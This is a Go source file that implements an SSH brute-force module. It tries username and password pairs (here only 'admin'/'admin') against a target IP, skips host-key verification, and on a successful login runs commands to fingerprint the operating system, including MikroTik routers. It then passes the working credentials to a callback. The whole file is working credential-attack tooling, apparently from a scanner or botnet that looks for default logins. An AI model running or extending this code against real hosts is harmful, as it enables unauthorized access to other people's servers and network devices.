package dnrt

import (
	"errors"
	"fmt"
	"net"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

type ServiceType int

const (
	ServiceSSH ServiceType = iota
)

type Bruteforcer interface {
	brute(net.IP, uint16)
}

func NewBruteforcer(serviceType ServiceType, callback BruteCallback) Bruteforcer {
	switch serviceType {
	case ServiceSSH:
		return SSHBruteforcer{
			callback: callback,
		}
	}

	return SSHBruteforcer{callback: callback}
}

type BruteResult struct {
	IP          net.IP
	Port        uint16
	User        string
	Pass        string
	ServiceType ServiceType
	Description string
}

type BruteCallback func(BruteResult)

func getUserList() []string {
	return []string{
		"admin",
	}
}

func getPassList() []string {
	return []string{
		"admin",
	}
}

type SSHBruteforcer struct {
	Bruteforcer
	callback BruteCallback
}

func (b SSHBruteforcer) brute(ip net.IP, port uint16) {
	userList := getUserList()
	passList := getPassList()

	for _, user := range userList {
		for _, pass := range passList {
			os, err := checkSSH(ip, port, user, pass)
			if err != nil {
				if isFatalErrorSSH(err.Error()) {
					return
				}
				continue
			}

			b.callback(BruteResult{IP: ip, Port: port, User: user, Pass: pass, ServiceType: ServiceSSH, Description: os})
			return
		}
	}
}

func checkSSH(ip net.IP, port uint16, user string, pass string) (os string, err error) {
	var cmdOutput string
	client, err := connectToHost(fmt.Sprintf("%s:%d", ip, 22), user, pass)
	if err != nil {
		return "", err
	}

	defer client.Close()

	distroMap := map[string]string{
		"fedora": "Fedora",
		"ubuntu": "Ubuntu",
		"debian": "Debian",
	}

	cmdOutput, _ = runCommand(client, "cat /etc/os-release")
	if len(cmdOutput) > 0 {
		for id, distro := range distroMap {
			if strings.Contains(cmdOutput, "ID="+id) {
				return distro, nil
			}
		}
	}

	cmdOutput, _ = runCommand(client, "system resource print")
	if strings.Contains(cmdOutput, "MikroTik") {
		return "MikroTik", nil
	}

	return "", errors.New("can't detect OS")
}

func connectToHost(host string, user string, pass string) (*ssh.Client, error) {
	sshConfig := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Second,
	}

	client, err := ssh.Dial("tcp", host, sshConfig)
	if err != nil {
		return nil, err
	}

	return client, nil
}

func runCommand(client *ssh.Client, command string) (string, error) {
	session, err := client.NewSession()
	if err != nil {
		return "", err
	}

	time.AfterFunc(time.Second*10, func() {
		session.Close()
	})

	out, err := session.CombinedOutput(command)
	if err != nil {
		return "", err
	}

	session.Close()
	return string(out), nil
}

func isFatalErrorSSH(err string) bool {
	stopErrors := []string{
		"invalid packet length",
		"connection reset by peer",
		"handshake failed: EOF",
		"no common algorithm for client to server cipher",
		"i/o timeout",
		"network is unreachable",
		"getsockopt: connection refused",
		"can't detect OS",
	}

	for _, fatalError := range stopErrors {
		if strings.Contains(err, fatalError) {
			return true
		}
	}

	return false
}
